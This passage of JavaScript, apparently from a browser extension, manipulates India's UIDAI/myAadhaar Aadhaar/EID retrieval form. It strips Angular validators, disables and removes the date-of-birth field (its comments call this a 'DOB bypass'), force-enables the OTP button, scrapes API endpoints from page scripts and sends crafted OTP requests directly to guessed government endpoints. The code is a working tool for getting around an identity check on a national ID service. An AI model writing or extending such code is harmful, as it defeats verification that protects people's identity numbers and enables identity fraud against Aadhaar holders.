      orLinks: discoverOrLinks(uiSel).map((l) => l.text),
    };
  }

  function scanCmpForOtp(cmp, out, seen) {
    if (!cmp || typeof cmp !== 'object' || seen.has(cmp)) return;
    seen.add(cmp);
    const names = new Set([...Object.keys(cmp), ...Object.getOwnPropertyNames(Object.getPrototypeOf(cmp) || {})]);
    names.forEach((name) => {
      if (!/otp|send|submit|retrieve|generate|request|validate|uideid|proceed|continue/i.test(name)) return;
      if (typeof cmp[name] !== 'function') return;
      out.push({ cmp, name });
    });
    [cmp.service, cmp.apiService, cmp.retrieveService, cmp.http, cmp.form].forEach((svc) => {
      if (svc && typeof svc === 'object') scanCmpForOtp(svc, out, seen);
    });
  }

  function deepInvokeOtp(btn, log) {
    const out = [];
    const seen = new Set();
    const roots = new Set([btn, document.querySelector('app-root'), ...qAll('[ng-version], form, mat-form-field, button, app-retrieve-eid-uid, app-root *')]);
    roots.forEach((el) => {
      if (!el) return;
      let cur = el;
      for (let i = 0; i < 30 && cur; i++, cur = cur.parentElement) {
        if (typeof window.ng?.getComponent === 'function') {
          try {
            scanCmpForOtp(window.ng.getComponent(cur), out, seen);
          } catch (_e) {}
        }
        walkNg(cur, (item) => scanCmpForOtp(item, out, seen));
      }
    });
    if (typeof window.ng?.getComponent === 'function') {
      qAll('*').forEach((el) => {
        try {
          scanCmpForOtp(window.ng.getComponent(el), out, seen);
        } catch (_e) {}
      });
    }
    const tried = new Set();
    for (const hit of out) {
      const key = hit.cmp.constructor?.name + '.' + hit.name;
      if (tried.has(key)) continue;
      tried.add(key);
      try {
        runInAngularZone(() => hit.cmp[hit.name]());
        log?.('info', 'Angular OTP invoke', hit.name);
        return true;
      } catch (_e) {}
    }
    return false;
  }

  function findNgControlFromElement(el) {
    if (!el) return null;
    let cur = el;
    for (let depth = 0; depth < 28 && cur; depth++, cur = cur.parentElement) {
      const ctx = cur.__ngContext__;
      if (Array.isArray(ctx)) {
        for (let i = 0; i < ctx.length; i++) {
          const item = ctx[i];
          if (item?.control?.setValue) return { control: item.control, name: item.name || item._parent?.name || '' };
          if (item?.setValue && item?.status && typeof item.updateValueAndValidity === 'function') {
            return { control: item, name: item._parent?.name || '' };
          }
        }
      }
      if (typeof window.ng?.getComponent === 'function') {
        try {
          const cmp = window.ng.getComponent(cur);
          const fcn = el.getAttribute('formcontrolname') || el.getAttribute('ng-reflect-name') || '';
          const forms = [cmp?.form, cmp?.formGroup, cmp?.retrieveForm, cmp?.aadhaarForm];
          for (const form of forms) {
            if (!form?.controls) continue;
            if (fcn && form.controls[fcn]) return { control: form.controls[fcn], name: fcn };
            for (const [key, ctrl] of Object.entries(form.controls)) {
              if (ctrl?.valueAccessor?.nativeElement === el) return { control: ctrl, name: key };
            }
          }
        } catch (_e) {}
      }
    }
    return null;
  }

  function syncNgControlsFromDom(log) {
    let n = 0;
    getMatFields().forEach((f) => {
      const type = classifyField(f);
      if (type === 'dob' || type === 'toggle' || type === 'email') return;
      const input = f.input;
      if (!input || input.type === 'hidden') return;
      const val = readInputVal(input);
      if (!val) return;
      const hit = findNgControlFromElement(input);
      if (!hit?.control?.setValue) return;
      try {
        hit.control.setValue(val, { emitEvent: true });
        hit.control.markAsDirty?.();
        hit.control.markAsTouched?.();
        hit.control.updateValueAndValidity?.({ emitEvent: true });
        n += 1;
      } catch (_e) {}
    });
    if (n) log?.('info', 'NgControl synced', { count: n });
    return n;
  }

  function syncAngularInputs(log) {
    if (isReactSite()) return syncReactInputs(log);
    let n = 0;
    getMatFields().forEach((f) => {
      const type = classifyField(f);
      if (type === 'dob' || type === 'toggle' || type === 'email') return;
      const input = f.input;
      if (!input || input.type === 'hidden') return;
      const val = readInputVal(input);
      if (!val) return;
      try {
        nativeInputSet?.call(input, val);
      } catch (_e) {}
      try {
        input.dispatchEvent(
          new InputEvent('input', { bubbles: true, cancelable: true, inputType: 'insertText', data: val })
        );
      } catch (_e1) {
        input.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
      }
      ['change', 'blur'].forEach((evt) => {
        input.dispatchEvent(new Event(evt, { bubbles: true, cancelable: true }));
      });
      n += 1;
    });
    syncNgControlsFromDom(log);
    if (n) log?.('info', 'Angular inputs synced', { count: n });
    return n;
  }

  function fixAngularValidators(log) {
    let n = 0;
    collectFormGroups().forEach((form) => {
      if (!form.controls) return;
      Object.entries(form.controls).forEach(([key, ctrl]) => {
        if (!isDobControlKey(key) && !/email/i.test(key)) return;
        ctrl.clearValidators?.();
        ctrl.setErrors?.(null);
        try {
          ctrl.disable?.({ emitEvent: false });
        } catch (_e) {}
        n += 1;
      });
      form.updateValueAndValidity?.({ emitEvent: false });
    });
    if (n) log?.('info', 'Angular validators cleared', { count: n });
    return n;
  }

  function patchAngularControlValues(log) {
    const name = readFieldVal('name');
    const mobile = readFieldVal('mobile');
    const captcha = readFieldVal('captcha');
    let n = 0;
    collectFormGroups().forEach((form) => {
      if (!form.controls) return;
      Object.entries(form.controls).forEach(([key, ctrl]) => {
        if (isDobControlKey(key) || /email/i.test(key)) {
          ctrl.clearValidators?.();
          ctrl.setErrors?.(null);
          try {
            ctrl.disable?.({ emitEvent: false });
          } catch (_e) {}
          return;
        }
        let val = '';
        if (/name|fullname/i.test(key)) val = name;
        else if (/mobile|phone/i.test(key)) val = mobile;
        else if (/captcha/i.test(key)) val = captcha;
        if (!val || !ctrl?.setValue) return;
        try {
          ctrl.setValue(val, { emitEvent: true });
          ctrl.markAsDirty?.();
          ctrl.markAsTouched?.();
          n += 1;
        } catch (_e) {}
      });
      try {
        form.updateValueAndValidity?.({ emitEvent: true });
      } catch (_e) {}
    });
    if (n) log?.('info', 'Angular controls patched', { count: n });
    return n;
  }

  function getHttpClient(log) {
    const root = document.querySelector('app-root, [ng-version]');
    if (!root || typeof window.ng?.getInjector !== 'function') return null;
    try {
      const injector = window.ng.getInjector(root);
      const buckets = [injector.records, injector._records, injector._ngOnDestroyHooks];
      for (const bucket of buckets) {
        if (!bucket) continue;
        const entries = bucket instanceof Map ? [...bucket.entries()] : Object.entries(bucket);
        for (const [, rec] of entries) {
          const svc = rec?.value ?? (typeof rec?.factory === 'function' ? rec.factory() : null);
          if (svc?.post && svc?.get) return svc;
        }
      }
      for (const key of Object.keys(injector)) {
        const val = injector[key];
        if (val?.post && val?.get) return val;
      }
    } catch (err) {
      log?.('warn', 'HttpClient scan fail', String(err).slice(0, 80));
    }
    return null;
  }

  async function invokeViaPageHttp(uiSel, log) {
    const http = getHttpClient(log);
    if (!http?.post) return false;
    const payloads = buildRetrievePayloads(uiSel);
    const paths = rankOtpPaths(['/generic/retrieveuideid']).slice(0, 2);
    for (const path of paths) {
      for (const body of payloads.slice(0, 3)) {
        const clean = stripDobFromBody(body).body;
        try {
          const result = await new Promise((resolve) => {
            let done = false;
            const obs = runInAngularZone(() => http.post(path, clean, { withCredentials: true }));
            if (!obs || typeof obs.subscribe !== 'function') return resolve(false);
            obs.subscribe({
              next: (res) => {
                if (done) return;
                done = true;
                log?.('info', 'HttpClient OTP OK', { path, res: JSON.stringify(res).slice(0, 120) });
                resolve(true);
              },
              error: (err) => {
                if (done) return;
                done = true;
                log?.('info', 'HttpClient OTP try', {
                  path,
                  status: err?.status,
                  msg: String(err?.message || err?.error || err).slice(0, 120),
                });
                resolve(false);
              },
            });
            setTimeout(() => resolve(false), 8000);
          });
          if (result) return true;
        } catch (_e) {}
      }
    }
    return false;
  }

  function triggerAngularOtp(btn, log) {
    return deepInvokeOtp(btn, log);
  }

  function readFieldVal(type) {
    for (const f of getMatFields()) {
      if (classifyField(f) === type) return readInputVal(f.input);
    }
    return '';
  }

  function getCaptchaMeta() {
    let id = '';
    let txn = '';
    qAll('input[type="hidden"]').forEach((inp) => {
      const n = norm(inp.name || inp.id || inp.getAttribute('formcontrolname') || '');
      const v = readInputVal(inp);
      if (!v) return;
      if (/captcha.*id|captchaid|cid|txn/i.test(n)) id = v;
      if (/captcha.*txn|transaction/i.test(n)) txn = v;
    });
    qAll('img').forEach((img) => {
      const src = img.src || '';
      if (!/captcha|kaptcha|verify/i.test(src)) return;
      const m = src.match(/[?&](?:id|txn|token|sid|key)=([^&]+)/i);
      if (m) id = decodeURIComponent(m[1]);
    });
    return { id, txn };
  }

  function getRetrieveReqType() {
    const radios = qAll('mat-radio-button, input[type="radio"]');
    for (const r of radios) {
      const input = r.querySelector?.('input[type="radio"]') || (r.type === 'radio' ? r : null);
      const checked =
        r.classList?.contains('mat-mdc-radio-checked') ||
        r.classList?.contains('mat-radio-checked') ||
        input?.checked;
      if (!checked) continue;
      const text = norm(r.textContent || r.getAttribute('aria-label') || '');
      if (/eid|enrol/i.test(text)) return 'EID';
      if (/uid|aadhaar/i.test(text)) return 'UID';
    }
    const blob = norm(document.body?.innerText || '').slice(0, 600);
    if (/enrolment\s*(id|number)|\beid\b/i.test(blob) && !/aadhaar\s*number|\buid\b/i.test(blob)) return 'EID';
    return 'UID';
  }

  function buildOtpPayload(uiSel) {
    const name = readFieldVal('name');
    const mobile = readFieldVal('mobile');
    const captcha = readFieldVal('captcha');
    const meta = getCaptchaMeta();
    const reqType = getRetrieveReqType();
    return {
      name,
      fullName: name,
      mobile,
      mobileNo: mobile,
      mobileNumber: mobile,
      phone: mobile,
      captcha,
      captchaCode: captcha,
      captchaValue: captcha,
      captchaId: meta.id,
      captchaTxnId: meta.txn || meta.id,
      verifyVia: 'mobile',
      verificationType: 'mobile',
      otpType: 'mobile',
      reqType,
      retrieveType: reqType,
      requestType: reqType,
      emailId: '',
      email: '',
    };
  }

  function buildRetrievePayloads(uiSel) {
    const d = buildOtpPayload(uiSel);
    const isEid = d.reqType === 'EID';
    const uidType = isEid ? 'EID' : 'UID';
    const list = [
      {
        fullName: d.name,
        mobileNo: d.mobile,
        emailId: '',
        captcha: d.captcha,
        captchaId: d.captchaId,
        requestType: uidType,
        action: 'GENERATE_OTP',
      },
      {
        fullName: d.name,
        mobileNo: d.mobile,
        captchaValue: d.captcha,
        captchaTxnId: d.captchaTxnId,
        retrieveType: uidType,
        otpChannel: 'M',
      },
      {
        name: d.name,
        mobile: d.mobile,
        captcha: d.captcha,
        captchaId: d.captchaId,
        uid: isEid ? '' : undefined,
        eid: isEid ? '' : undefined,
        reqType: uidType,
      },
      {
        FullName: d.name,
        MobileNo: d.mobile,
        EmailID: '',
        Captcha: d.captcha,
        CaptchaId: d.captchaId,
        ReqType: isEid ? 'E' : 'U',
      },
      d,
    ];
    const seen = new Set();
    return list.filter((b) => {
      const k = JSON.stringify(b);
      if (seen.has(k)) return false;
      seen.add(k);
      return true;
    });
  }

  async function scrapeChunkEndpoints(log) {
    const found = new Set();
    const pathRe = /["'](\/[a-zA-Z0-9_\-./]*(?:otp|OTP|generate|retrieve|uideid|send|login)[a-zA-Z0-9_\-./]*)["']/g;
    const urlRe = /["'](https?:\/\/[^"']*(?:retrieve|uideid|otp|myaadhaar|uidai)[^"']*)["']/gi;
    function scanText(text) {
      if (!text) return;
      let m;
      while ((m = pathRe.exec(text))) {
        if (m[1].length < 120) found.add(m[1]);
      }
      while ((m = urlRe.exec(text))) {
        if (m[1].length < 160) found.add(m[1]);
      }
    }
    qAll('script:not([src])').forEach((s) => scanText(s.textContent));
    const srcs = [...document.querySelectorAll('script[src]')]
      .map((s) => s.src)
      .filter((u) => u && /myaadhaar|uidai|main|chunk|polyfills|runtime|scripts/i.test(u));
    for (const url of srcs.slice(0, 12)) {
      try {
        scanText(await fetch(url, { credentials: 'omit' }).then((r) => r.text()));
      } catch (_e) {}
    }
    const list = rankOtpPaths([...found]).slice(0, 24);
    if (list.length) log?.('info', 'Scraped API paths', list);
    return list;
  }

  const PRIORITY_OTP_PATHS = ['/generic/retrieveuideid'];

  const DEFAULT_OTP_PATHS = [
    '/auth/login/generateOTP',
    '/api/auth/login/generateOTP',
    '/api/auth/generateOtp',
    '/api/login/generateOtp',
    '/login/generateOtp',
    '/retrieve/generateOtp',
    '/api/retrieve/generateOtp',
    '/retrieveAadhaar/generateOtp',
    '/generic/generateOtp',
    '/sso/login/generateOtp',
  ];

  function rankOtpPaths(extraPaths) {
    const origin = location.origin;
    const all = [...PRIORITY_OTP_PATHS, ...(extraPaths || []), ...DEFAULT_OTP_PATHS];
    const score = (p) => {
      const s = String(p || '');
      if (/retrieveuideid/i.test(s)) return 0;
      if (/\/generic\/retrieve/i.test(s)) return 1;
      if (/otp|generate/i.test(s) && /retrieve|uideid/i.test(s)) return 2;
      if (/otp|generate/i.test(s)) return 4;
      if (/\/send-metrics|retrieve-eid-uid$|\/sendOtp$|\/generateOtp$/i.test(s)) return 99;
      return 8;
    };
    return [...new Set(all.filter((p) => p && p.length > 3))]
      .filter((p) => {
        if (/^https?:\/\//i.test(p)) return p.startsWith(origin);
        return true;
      })
      .sort((a, b) => score(a) - score(b));
  }

  function otpUrlBases(path) {
    if (/^https?:\/\//i.test(path)) return [''];
    return [location.origin];
  }

  function resolveOtpUrl(base, path) {
    if (/^https?:\/\//i.test(path)) return path;
    return base + path;
  }

  function postOtpXhr(url, body, contentType, log) {
    return new Promise((resolve) => {
      const stripped = stripDobFromBody(typeof body === 'string' ? body : body);
      let payload = stripped.body;
      if (payload != null && typeof payload !== 'string' && !(payload instanceof FormData) && !(payload instanceof URLSearchParams)) {
        payload = JSON.stringify(payload);
      }
      const xhr = new XMLHttpRequest();
      xhr.__rebelDirect = true;
      xhr.open('POST', url, true);
      xhr.withCredentials = true;
      xhr.setRequestHeader('Accept', 'application/json, text/plain, */*');
      xhr.setRequestHeader('Content-Type', contentType);
      xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
      xhr.onload = () => {
        const text = xhr.responseText || '';
        log?.('info', 'Direct OTP API', {
          url: url.slice(0, 110),
          status: xhr.status,
          resp: text.slice(0, 120),
        });
        if (xhr.status >= 200 && xhr.status < 300) return resolve(true);
        if (/otp.*sent|success|txn|transaction/i.test(text)) return resolve(true);
        resolve(false);
      };
      xhr.onerror = () => {
        log?.('warn', 'Direct OTP xhr error', { url: url.slice(0, 90) });
        resolve(false);
      };
      try {
        xhr.send(payload);
      } catch (err) {
        log?.('warn', 'Direct OTP xhr send fail', String(err).slice(0, 60));
        resolve(false);
      }
    });
  }

  async function directOtpRequest(uiSel, log, extraPaths) {
    const bodies = buildRetrievePayloads(uiSel);
    const sample = bodies[0] || {};
    if (!sample.mobile && !sample.mobileNo && !sample.MobileNo) {
      log?.('warn', 'Direct OTP skip — mobile missing');
      return false;
    }
    if (!sample.captcha && !sample.captchaValue && !sample.Captcha) {
      log?.('warn', 'Direct OTP skip — captcha missing');
      return false;
    }
    const paths = rankOtpPaths(extraPaths).slice(0, 3);
    log?.('info', 'Direct OTP try', { paths, origin: location.origin, reqType: getRetrieveReqType() });

    let tries = 0;
    const maxTries = 8;
    for (const path of paths) {
      const url = resolveOtpUrl(location.origin, path);
      for (const body of bodies) {
        if (tries >= maxTries) return false;
        tries += 1;
        const cleanBody = stripDobFromBody(body).body;
        if (await postOtpXhr(url, cleanBody, 'application/json', log)) return true;
      }
    }
    return false;
  }

  function runInAngularZone(fn) {
    try {
      const root = document.querySelector('app-root, [ng-version]') || document.body;
      if (typeof window.ng?.getInjector === 'function') {
        const inj = window.ng.getInjector(root);
        const Zone = inj.get?.('NgZone') || inj.get?.(window.ng?.core?.NgZone);
        if (Zone?.run) return Zone.run(fn);
      }
    } catch (_e) {}
    return fn();
  }

  async function invokeOtpPipeline(btn, uiSel, log, netBefore, opts) {
    opts = opts || {};
    if (!opts.skipPrep) {
      if (opts.lightPrep && prepareOtpLight) prepareOtpLight(uiSel, log);
      else await advancedBypassAsync(uiSel, log);
    }
    const prep = buildSubmitState(uiSel, log);
    if (!prep.dobBypassed) {
      log?.('error', 'DOB bypass fail', prep);
      return { ok: false, prep };
    }
    if (!prep.formOk) {
      log?.('error', 'Form incomplete', prep.after?.fields);
      return { ok: false, prep };
    }

    log?.('info', 'OTP pipeline start', { v: ENGINE_VERSION, skipNative: !!opts.skipNative });

    patchAngularControlValues(log);
    syncAngularInputs(log);
    fixAngularValidators(log);
    enableOtpButtons();

    if (!opts.skipNative) {
      runInAngularZone(() => {
        try {
          btn.click();
        } catch (_e) {}
      });
      await waitMs(2500);
      if (typeof netBefore === 'function' && netBefore()) {
        return { ok: true, prep, via: 'native-click' };
      }
    }

    if (await invokeViaPageHttp(uiSel, log)) {
      await waitMs(2500);
      if (typeof netBefore === 'function' && netBefore()) {
        return { ok: true, prep, via: 'http-client' };
      }
    }

    if (deepInvokeOtp(btn, log)) {
      await waitMs(2500);
      if (typeof netBefore === 'function' && netBefore()) {
        return { ok: true, prep, via: 'angular' };
      }
    }

    forceSubmitOtp(btn, log);
    await waitMs(2500);
    if (typeof netBefore === 'function' && netBefore()) {
      return { ok: true, prep, via: 'force-click' };
    }

    log?.('error', 'OTP pipeline fail — Angular API 2xx nahi aaya (405=direct POST kaam nahi karta)');
    return { ok: false, prep };
  }

  function forceSubmitOtp(btn, log) {
    if (!btn) return false;
    enableOtpButtons();
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.classList?.remove('mat-button-disabled', 'mat-mdc-button-disabled', 'disabled');
    btn.style.pointerEvents = 'auto';
    if (triggerAngularOtp(btn, log)) return true;
    const form = btn.closest('form');
    if (form?.requestSubmit) {
      try {
        runInAngularZone(() => form.requestSubmit(btn));
        log?.('info', 'OTP force — form.requestSubmit');
        return true;
      } catch (_e) {}
    }
    runInAngularZone(() => simulateClick(btn));
    log?.('info', 'OTP force — button click');
    return true;
  }

  /** Sirf CSS hide — disable NAHI; mobile mode me hide mat karo (Angular break) */
  function softHideEmailOnly(log, uiSel) {
    if (uiSel && shouldSkipEmailToggle(uiSel)) return 0;
    const blocks = findEmailBlocks();
    if (!blocks.length) return 0;
    hideEmail(null, log);
    return blocks.length;
  }

  function neutralizeEmail(log, uiSel) {
    return softHideEmailOnly(log, uiSel);
  }

  /** OTP click se pehle — email hide nahi, sirf sync + DOB clean */
  function prepareOtpLight(uiSel, log) {
    if (dobFieldVisible(uiSel)) removeDobFromDom(uiSel, log);
    fixAngularValidators(log);
    patchAngularControlValues(log);
    syncAngularInputs(log);
    enableOtpButtons();
    return buildSubmitState(uiSel, log, { quiet: true });
  }

  function mobileFieldFilled(uiSel) {
    const snap = getFieldSnapshot(uiSel);
    return !!snap.find((f) => f.type === 'mobile' && f.ok);
  }

  function shouldSkipEmailToggle(uiSel) {
    return mobileFieldFilled(uiSel) && isDobBypassed(uiSel);
  }

  async function ensureUidaiMobileMode(uiSel, log) {
    if (shouldSkipEmailToggle(uiSel)) {
      log?.('info', 'Mobile mode locked — toggle clicks skip', {});
      softHideEmailOnly(log, uiSel);
      return true;
    }
    const email = discoverOrLinks(uiSel).find((l) => l.kind === 'email');
    if (email) {
      log?.('info', 'UIDAI: email mode switch', email.text);
      simulateClick(email.el);
      await waitMs(1600);
    }
    const mobile = discoverOrLinks(uiSel).find(
      (l) => l.kind === 'mobile' || (/enter\s*mobile/i.test(l.text) && isLinkish(l.el))
    );
    if (mobile) {
      log?.('info', 'UIDAI: mobile mode switch', mobile.text);
      simulateClick(mobile.el);
      await waitMs(1600);
    }
    return true;
  }

  /** Bypass = DOB screen/form se hat gaya (DOM me ho sakta hai par UIDAI ne hide/remove kiya) */
  function isDobInputActive(input, uiSel) {
    if (!input || input.type === 'hidden') return false;
    if (input.dataset?.rebelDobOff === '1') return false;
    if (input.closest('[data-rebel-dob-hidden],[data-rebel-dob-off]')) return false;
    const box = fieldContainer(input);
    if (box) {
      if (box.hidden || box.getAttribute('aria-hidden') === 'true') return false;
      const bs = getComputedStyle(box);
      if (bs.display === 'none' || bs.visibility === 'hidden' || parseFloat(bs.opacity) === 0) return false;
      const br = box.getBoundingClientRect();
      if (br.width < 1 || br.height < 1) return false;
    }
    return isVisible(input, uiSel);
  }

  function isDobBypassed(uiSel) {
    const inputs = getDobInputs();
    if (!inputs.length) return true;
    return !inputs.some((i) => isDobInputActive(i, uiSel));
  }

  /** OR Email → OR Mobile (ya sirf OR Mobile) — UIDAI native mode switch */
  function quickModeSwitch(uiSel, log) {
    if (shouldSkipEmailToggle(uiSel)) {
      log?.('info', 'quickModeSwitch skip — mobile active', {});
      return { email: false, mobile: true, found: 0, skipped: true };
    }
    const links = discoverOrLinks(uiSel);
    const email = links.find((l) => l.kind === 'email');
    const mobile = links.find((l) => l.kind === 'mobile');
    if (email) {
      log?.('info', 'Mode click', email.text);
      simulateClick(email.el);
    }
    if (mobile) {
      log?.('info', 'Mode click', mobile.text);
      simulateClick(mobile.el);
    } else if (!email && links[0]) {
      log?.('info', 'Mode click', links[0].text);
      simulateClick(links[0].el);
    }
    return { email: !!email, mobile: !!mobile, found: links.length };
  }

  function ensureMobileModeSync(uiSel, log) {
    if (shouldSkipEmailToggle(uiSel)) {
      softHideEmailOnly(log, uiSel);
      return true;
    }
    if (getDobInputs().length) quickModeSwitch(uiSel, log);
    softHideEmailOnly(log, uiSel);
    return true;
  }

  function walkNg(el, fn) {
    const ctx = el?.__ngContext__;
    if (!Array.isArray(ctx)) return;
    ctx.forEach((item) => fn(item, el));
  }

  function readInputVal(input) {
    if (!input) return '';
    const v = input.value || input.getAttribute('value') || '';
    return String(v).trim();
  }

  function getComponentFromElement(el) {
    if (!el) return null;
    if (typeof window.ng?.getComponent === 'function') {
      try {
        return window.ng.getComponent(el);
      } catch (_e) {}
    }
    const ctx = el.__ngContext__;
    if (!Array.isArray(ctx)) return null;
    const tView = ctx[1];
    if (tView?.components?.length) {
      for (const idx of tView.components) {
        const lView = ctx[idx];
        if (Array.isArray(lView) && lView[8] && lView[0] === el) return lView[8];
      }
    }
    for (let i = 0; i < ctx.length; i++) {
      const item = ctx[i];
      if (item?.form?.controls) return item;
      if (item?.controls && item.updateValueAndValidity) return item;
    }
    return null;
  }

  function deepScanObject(root, found, seen, depth) {
    if (!root || depth > 10 || typeof root !== 'object' || seen.has(root)) return;
    seen.add(root);
    if (isFormGroup(root) && !found.includes(root)) found.push(root);
    if (root.control?.setValue && root.name && isDobControlKey(root.name)) {
      found.push({ ctrl: root.control, key: root.name, ngControl: true });
    }
    if (Array.isArray(root)) {
      root.forEach((x) => deepScanObject(x, found, seen, depth + 1));
      return;
    }
    try {
      Object.values(root).forEach((x) => deepScanObject(x, found, seen, depth + 1));
    } catch (_e) {}
  }

  function isDobControlKey(key) {
    return /dob|birth|dateofbirth|date_of_birth|dateOfBirth/i.test(key || '');
  }

  function isFormGroup(obj) {
    return obj && typeof obj === 'object' && obj.controls && typeof obj.updateValueAndValidity === 'function';
  }

  function walkAllNg(fn) {
    const seen = new WeakSet();
    qAll('*').forEach((el) => {
      walkNg(el, (item) => {
        if (!item || typeof item !== 'object' || seen.has(item)) return;
        seen.add(item);
        fn(item, el);
      });
    });
  }

  function collectFormGroups() {
    const groups = [];
    const seen = new WeakSet();
    const scanSeen = new WeakSet();

    walkAllNg((item) => {
      [item, item?.form].forEach((form) => {
        if (!isFormGroup(form) || seen.has(form)) return;
        seen.add(form);
        groups.push(form);
      });
    });

    qAll('*').forEach((el) => {
      const ctx = el.__ngContext__;
      if (Array.isArray(ctx)) deepScanObject(ctx, groups, scanSeen, 0);
    });

    getDobInputs().forEach((input) => {
      let el = input;
      for (let i = 0; i < 12 && el; i++, el = el.parentElement) {
        const cmp = getComponentFromElement(el);
        [cmp, cmp?.form, cmp?.retrieveForm, cmp?.aadhaarForm, cmp?.formGroup].forEach((form) => {
          if (!isFormGroup(form) || seen.has(form)) return;
          seen.add(form);
          groups.push(form);
        });
      }
    });

    getMatFields().forEach((f) => {
      const type = classifyField(f);
      if (type !== 'name' && type !== 'mobile' && type !== 'captcha') return;
      let el = f.input || f.mff;
      for (let i = 0; i < 20 && el; i++, el = el.parentElement) {
        walkNg(el, (item) => {
          [item, item?.form].forEach((form) => {
            if (!isFormGroup(form) || seen.has(form)) return;
            seen.add(form);
            groups.push(form);
          });
        });
        if (Array.isArray(el.__ngContext__)) deepScanObject(el.__ngContext__, groups, scanSeen, 0);
        const cmp = getComponentFromElement(el);
        [cmp, cmp?.form, cmp?.formGroup, cmp?.retrieveForm, cmp?.aadhaarForm].forEach((form) => {
          if (!isFormGroup(form) || seen.has(form)) return;
          seen.add(form);
          groups.push(form);
        });
      }
    });

    return groups;
  }

  function findOtpButton() {
    return qAll('button, [role="button"], input[type="submit"]').find((btn) => {
      const t = norm(btn.textContent || btn.value || '');
      return t.includes('send otp') || t.includes('request otp');
    });
  }

  function enableMatOtpButton(log) {
    const btn = findOtpButton();
    if (!btn) return false;
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.setAttribute('aria-disabled', 'false');
    btn.classList.remove('mat-mdc-button-disabled', 'mat-button-disabled', 'disabled', 'mdc-button--disabled');
    btn.style.pointerEvents = 'auto';
    btn.style.opacity = '1';
  }

  function prepForUserOtp(uiSel, log) {
    if (dobFieldVisible(uiSel)) {
      if (isReactSite()) neutralizeReactDob(uiSel, log);
      else removeDobFromDom(uiSel, log);
    }
    if (isReactSite()) {
      syncReactInputs(log);
      patchReactFormValues(log);
      forceReactOtpClickable(log, true);
      patchReactOtpClick(uiSel, log);
    } else {
      fixAngularValidators(log);
      patchAngularControlValues(log);
      syncAngularInputs(log);
      syncNgControlsFromDom(log);
      enableOtpButtons();
      enableMatOtpButton(log);
    }
    return buildSubmitState(uiSel, log, { quiet: true });
  }

  function collectNgControls() {
    const out = [];
    const seen = new WeakSet();
    function addCtrl(ctrl, key, el) {
      if (!ctrl?.setValue || seen.has(ctrl)) return;
      seen.add(ctrl);
      out.push({ ctrl, key: key || 'ctrl', el });
    }
    getMatFields().forEach((f) => {
      const type = classifyField(f);
      if (type === 'toggle') return;
      const hit = findNgControlFromElement(f.input);
      if (hit?.control) addCtrl(hit.control, hit.name || type, f.input);
    });
    getDobInputs().forEach((input) => {
      let el = input;
      for (let i = 0; i < 12 && el; i++, el = el.parentElement) {
        walkNg(el, (item) => {
          if (item?.control?.setValue) addCtrl(item.control, item.name || item._parent?.name || 'dob', input);
        });
        if (Array.isArray(el.__ngContext__)) {
          const scanSeen = new WeakSet();
          deepScanObject(el.__ngContext__, out, scanSeen, 0);
        }
      }
    });
    return out;
  }

  function dobControlEmpty(ctrl) {
    const v = ctrl?.value;
    return v == null || v === '' || (typeof v === 'string' && !v.trim());
  }

  function patchDobControl() {
    return false;
  }

  function setDobOnInput() {
    return false;
  }

  function syncDobDom() {
    return 0;
  }

  function patchAllDobControls() {
    return 0;
  }

  /** Sirf DOB clear — fake date fill disabled permanently */
  function patchAngularForms(log) {
    clearDobValuesOnly(log);
    return { patched: 0, dom: 0, forms: [], ngControls: 0 };
  }

  function getFieldSnapshot(uiSel) {
    return getMatFields()
      .filter((f) => {
        const t = classifyField(f);
        if (t === 'dob' || t === 'toggle') return false;
        if (t === 'email' && isEmailNeutralized(f.input)) return false;
        return true;
      })
      .map((f) => ({
        type: classifyField(f),
        label: f.label.slice(0, 28),
        val: readInputVal(f.input).slice(0, 20),
        ok: !!readInputVal(f.input),
      }));
  }

  function isFormReadyForOtp(uiSel) {
    if (!isDobBypassed(uiSel)) return false;
    const snap = getFieldSnapshot(uiSel);
    const mobile = snap.find((f) => f.type === 'mobile');
    const captcha = snap.find((f) => f.type === 'captcha');
    return !!(mobile?.ok && captcha?.ok);
  }

  function ngCtxDepth(el) {
    let cur = el;
    for (let i = 0; i < 20 && cur; i++, cur = cur.parentElement) {
      if (Array.isArray(cur.__ngContext__)) return { depth: i, type: 'array' };
    }
    return { depth: -1, type: 'none' };
  }

  function getFormDiagnostics(uiSel) {
    const groups = collectFormGroups().filter((g) => g.controls);
    const mobileInput = getMatFields().find((f) => classifyField(f) === 'mobile')?.input;
    const mobileCtx = mobileInput ? ngCtxDepth(mobileInput) : { depth: -1, type: 'none' };
    const ngHits = getMatFields()
      .filter((f) => {
        const t = classifyField(f);
        return t === 'name' || t === 'mobile' || t === 'captcha';
      })
      .map((f) => ({ type: classifyField(f), hasNg: !!findNgControlFromElement(f.input)?.control }));
    const otpBtn = findOtpButton();
    const framework = detectFramework();
    return {
      framework,
      formCount: groups.length,
      ngControls: collectNgControls().length,
      ngFieldHits: ngHits,
      invalid: groups.filter((g) => g.status === 'INVALID').length,
      statuses: groups.slice(0, 5).map((g) => g.status),
      ngCtxType: mobileCtx.type,
      ngCtxDepth: mobileCtx.depth,
      hasNgApi: typeof window.ng?.getComponent === 'function',
      otpBtnDisabled: !!(otpBtn?.disabled || otpBtn?.classList?.contains('mat-mdc-button-disabled')),
      dobBypassed: isDobBypassed(uiSel),
      dobInForm: getDobInputs().length,
      dobVisible: dobFieldVisible(uiSel),
      fields: getFieldSnapshot(uiSel),
      dobInputs: getDobInputs().map((i) => ({
        val: readInputVal(i).slice(0, 14),
        type: i.type || '',
        hidden: !!i.closest('[data-rebel-dob-hidden]'),
        ro: i.hasAttribute('readonly'),
        ok: i.dataset.rebelDobOk === '1',
      })),
      orLinks: discoverOrLinks(uiSel).map((l) => l.text),
    };
  }

  function disableDobDom(block) {
    if (!block) return;
    block.classList.add(DISABLED_MARK);
    block.setAttribute('data-rebel-dob-off', '1');
    block.querySelectorAll('input, textarea, button, mat-datepicker-toggle, [role="button"]').forEach((el) => {
      el.disabled = true;
      el.setAttribute('disabled', 'true');
      el.setAttribute('aria-disabled', 'true');
      el.removeAttribute('required');
      el.setCustomValidity?.('');
    });
  }

  /** DOB bypass — user ko DOB fill nahi karna */
  function disableDob(uiSel, log) {
    injectCss();
    const blocks = findDobBlocks();
    blocks.forEach(disableDobDom);
    getDobInputs().forEach((input) => {
      input.disabled = true;
      input.setAttribute('disabled', 'true');
      input.removeAttribute('required');
      input.setAttribute('aria-required', 'false');
